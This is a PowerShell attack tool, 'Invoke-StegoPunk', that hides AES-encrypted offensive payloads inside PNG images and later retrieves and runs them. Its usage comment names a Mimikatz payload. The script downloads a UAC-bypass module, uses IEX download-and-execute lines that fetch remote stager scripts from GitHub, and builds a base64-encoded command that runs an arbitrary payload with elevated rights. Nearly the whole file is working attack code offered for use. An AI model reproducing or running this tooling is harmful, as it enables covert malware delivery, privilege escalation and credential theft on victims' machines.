

function Invoke-StegoPunk {


   Param (

            [ValidateSet("encryption","decryption")] 
            [string]$Mode,
            [string]$Fileurl,
            [string]$ImageUrl,
            [string]$ImageName,
            [string]$key,
            [ValidateSet("on","off")]
            [string]$b_UAC,
            [string]$command
            
          )  
#invoke-stegopunk -mode encryption -fileurl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1' -imageurl 'http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png' -imagename 'mix.png'                  
#invoke-stegopunk -mode decryption -b_UAC on -imageurl 'https://4.bp.blogspot.com/-e4-qZIRq0l0/VrNFM0tL1CI/AAAAAAAAAE4/nGUHo5FCs9U/s1600/qwerty.png'     
      if ($Mode -eq "encryption")
          {
          write-host "Encryption Mode" 
          $request = New-Object System.Net.WebCLient
          $proxy = New-Object System.Net.webproxy
          $request.proxy = $proxy
          $request.usedefaultcredentials = "true";
          write-host "Download First Stage File"
          $inputstring = $request.DownloadString($fileurl)
          #$Imagepath = "$ENV:temp\qwerty.png"
          write-host "Download PNG "
          $Imagepathname = "$env:userprofile\desktop\" + "$ImageName"
          $request.Downloadfile("$ImageUrl",$Imagepathname)
          write-host "Encrypting First Stage File ..."
          $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
          $AES = New-Object System.Security.Cryptography.AesManaged
          $Passphrase=$key
          $salt="My Voice is my P455W0RD!"
          $init="Yet another key"
          $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
          $salt = [Text.Encoding]::UTF8.GetBytes($salt)
          $AES.BlockSize = 128
          $AES.KeySize = 256
          $AES.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
          $AES.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
          $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
          $Encryptor = $AES.CreateEncryptor()
          $MemoryStream = New-Object -TypeName System.IO.MemoryStream
          $StreamMode =[System.Security.Cryptography.CryptoStreamMode]::Write
          $CryptoStream = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$Encryptor,$StreamMode
          $CryptoStream.Write($InputBytes, 0, $InputBytes.Length)
          $CryptoStream.Dispose()
          [byte[]]$Encrypted = $MemoryStream.ToArray()
          $CryptoStream.Close()
          $MemoryStream.Close()
          $AES.Clear()
          $mio = [system.Convert]::ToBase64String($Encrypted)
            write-host "Download UAC Stage File"
          $b_url = 'https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1'
            write-host "Encrypting UAC Module ..."
          
          $inputstring = $request.DownloadString($b_url)
          $InputBytes = [Text.Encoding]::utf8.GetBytes($InputString)
          $AES = New-Object System.Security.Cryptography.AesManaged
          $Passphrase=$key
          $salt="My Voice is my P455W0RD!"
          $init="Yet another key"
          $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase)
          $salt = [Text.Encoding]::UTF8.GetBytes($salt)
          $AES.BlockSize = 128
          $AES.KeySize = 256
          $AES.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, "SHA1", 5).GetBytes(32) #256/8
          $AES.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
          $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
          $Encryptor = $AES.CreateEncryptor()
          $MemoryStream = New-Object -TypeName System.IO.MemoryStream
          $StreamMode =[System.Security.Cryptography.CryptoStreamMode]::Write
          $CryptoStream = New-Object -TypeName System.Security.Cryptography.CryptoStream -ArgumentList $MemoryStream,$Encryptor,$StreamMode
          $CryptoStream.Write($InputBytes, 0, $InputBytes.Length)
          $CryptoStream.Dispose()
          [byte[]]$Encrypted = $MemoryStream.ToArray()
          $CryptoStream.Close()
          $MemoryStream.Close()
          $AES.Clear()
          $mio2 = [system.Convert]::ToBase64String($Encrypted)

          $mio = "wootwoot" + $mio + "weetweet" + $mio2
            write-host "Creating PNG "
          Add-Content "$ImagepathName" $mio
          } 
        else
          {
            if ($b_uac -eq "on")
                {
                $stage2 = New-Object System.Net.WebCLient
                $proxy = New-Object System.Net.webproxy
                $stage2.proxy = $proxy
                $stage2.usedefaultcredentials = "true"
                IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES2Stage.ps1')
                $base2 = Invoke-AES2Stage -key $key -imageurl $imageurl
                iex ($base2)
                $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -key ' + $key + ' -imageurl ' + $imageurl + '; iex ($base1);' + $command
                $ubytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
                $encodedcmd = [Convert]::ToBase64String($ubytes) 
                write-Host `n$encodedcmd
                write-Host "Powershell.exe $cmd"
                invoke-bypassuac -command "Powershell.exe -EncodedCommand $encodedcmd"
                }
                else
                {
                $stage2 = New-Object System.Net.WebCLient
                $proxy = New-Object System.Net.webproxy
                $stage2.proxy = $proxy
                $stage2.usedefaultcredentials = "true"
                IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1")
                $base1 = Invoke-AES1Stage -key $key -imageurl $imageurl
                iex ($base1)
                iec ($command)
                }
          }
         
}

